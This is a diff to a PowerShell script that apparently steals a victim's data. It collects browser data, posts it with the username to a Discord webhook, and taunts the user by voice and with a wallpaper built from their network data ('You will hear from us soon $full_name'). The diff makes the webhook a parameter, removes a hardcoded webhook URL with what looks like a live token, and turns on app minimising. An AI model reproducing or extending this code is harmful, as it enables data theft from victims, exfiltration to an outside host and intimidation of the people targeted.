@@ -1,3 +1,7 @@
+Param(
+    [string]$WebHook = "Path/to/file"
+)
+
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -46,7 +50,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = 'https://discord.com/api/webhooks/1061024530564395080/nYVEqY-Fm481D5q95EqLWIIgW0FagmQu9ttfo0T1kn1XZ19Lpun4lFVYSTqYnEMjs83h'
+    $hookurl = $WebHook
 
     $Body = @{
         'username' = $env:username
@@ -392,7 +396,7 @@ $s.Speak("Want to see something cool?")
 $Image = Gen-Image -Networks $Networks
 Set-WallPaper -Image $Image -Style "Fit"
 
-# Minimize-Apps
+Minimize-Apps
 
 
 $s.Speak("Have a look at your desktop, You will hear from us soon $full_name. Goodluck.")
